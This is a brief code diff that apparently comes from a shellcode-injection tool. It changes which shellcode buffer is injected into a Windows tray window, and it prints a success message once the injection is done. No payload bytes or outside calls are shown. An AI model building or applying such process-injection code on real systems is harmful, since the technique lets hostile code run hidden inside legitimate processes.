@@ -93,7 +93,7 @@ int main()
     switch (targetType) {
     case TARGET_TYPE::TRAY_WINDOW:
         // this injection is more fragile, use shellcode that makes no assumptions about the context
-        if (inject_into_tray(g_Shellcode2, sizeof(g_Shellcode2))) {
+        if (inject_into_tray(g_Shellcode, sizeof(g_Shellcode))) {
              printf("[SUCCESS] Code injected into tray window!\n");
              break;
         }
